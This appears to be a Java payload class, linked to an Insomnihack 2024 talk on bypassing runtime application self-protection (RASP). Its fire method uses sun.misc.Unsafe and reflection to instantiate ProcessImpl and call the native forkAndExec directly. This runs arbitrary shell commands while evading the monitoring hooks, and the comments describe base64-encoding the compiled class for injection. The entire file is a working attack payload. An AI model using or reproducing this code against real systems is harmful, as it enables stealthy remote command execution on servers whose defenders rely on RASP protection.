import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.Class;
import java.io.InputStream;
import java.io.DataInputStream;

/*
 * https://www.deep-kondah.com/smashing-runtime-application-self-protection-rasp/
 * https://github.com/mouadk/Insomnihack2024/blob/main/bypass-using-unsafe-abuse/exploit.py
 *
 * javac -g:none -Xlint:unchecked Singleton.java
 * base64 -w0 Singleton.class
 */

public class Singleton {
    public static Singleton s = new Singleton();

    public Singleton() {
    }

    public static String fire(String cmd) {
        try {
            Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Class<?> processClass = Class.forName("java.lang.ProcessImpl");
            Method allocateInstance = Class.forName("sun.misc.Unsafe").getMethod("allocateInstance", Class.class);
            Object processObject = allocateInstance.invoke(field.get(null), processClass);
            String[] cmdarray = cmd.split(" ");
            byte[][] args = new byte[cmdarray.length - 1][];
            int size = args.length; // For added NUL bytes
            for (int i = 0; i < args.length; i++) {
                args[i] = cmdarray[i + 1].getBytes();
                size += args[i].length;
            }
            byte[] argBlock = new byte[size];
            int i = 0;
            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, i, arg.length);
                i += arg.length + 1;
            }

            int[] envc = new int[1];
            byte[] envBlock = null;
            int[] std_fds = new int[]{-1, -1, -1};
            boolean forceNullOutputStream = false;
            byte[] bytes = cmdarray[0].getBytes();
            byte[] result = new byte[bytes.length + 1];
            System.arraycopy(bytes, 0, result, 0, bytes.length);
            result[result.length - 1] = (byte) 0;
            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
            Field helperpathField = processClass.getDeclaredField("helperpath");
            launchMechanismField.setAccessible(true);
            helperpathField.setAccessible(true);
            Object launchMechanismObject = launchMechanismField.get(processObject);
            byte[] helperpathObject = (byte[]) helperpathField.get (processObject);
            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{ int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class });
            forkMethod.setAccessible(true);
            int pid = (int) forkMethod.invoke(processObject, new Object[]{ ordinal + 1, helperpathObject, result, argBlock, args.length, null, envc[0], null, std_fds, false });
            //System.out.println("hehe native method forkMethod executed, nothing to see here :o");
            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(processObject, std_fds, false);
            Method getInputStreamMethod = processClass.getMethod("getInputStream");
            getInputStreamMethod.setAccessible(true);
            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
            DataInputStream dis = new DataInputStream(in);
            StringBuilder sb = new StringBuilder();
            String disr = dis.readLine();
            while ( disr != null ) {
                sb.append(disr);
                disr = dis.readLine();
            }
            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
